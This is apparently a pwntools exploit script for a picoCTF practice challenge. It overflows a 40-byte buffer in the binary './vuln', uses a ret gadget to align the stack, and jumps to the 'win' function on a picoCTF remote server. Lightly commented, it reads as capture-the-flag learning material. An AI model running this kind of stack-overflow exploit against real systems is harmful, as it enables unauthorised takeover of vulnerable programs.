from pwn import *

elf = context.binary = ELF('./vuln')
#ly = process()
ly = remote('mysterious-sea.picoctf.net', 57056)

# This is actually if you wanna some automatic get what do you want, but you must know what is this command for
rop = ROP(elf) #it will describe which file to gain rop
ret = rop.find_gadget(['ret'])[0] #it will search the `ret gadget`

# buf if you wanna do some manual, here:

#ret = p64(0x40101a)
#win = p64(0x401256)
payload = flat(
    'A'*40,
    ret,
    p64(elf.sym['win'])
)

ly.sendlineafter('name: ', payload)
ly.interactive()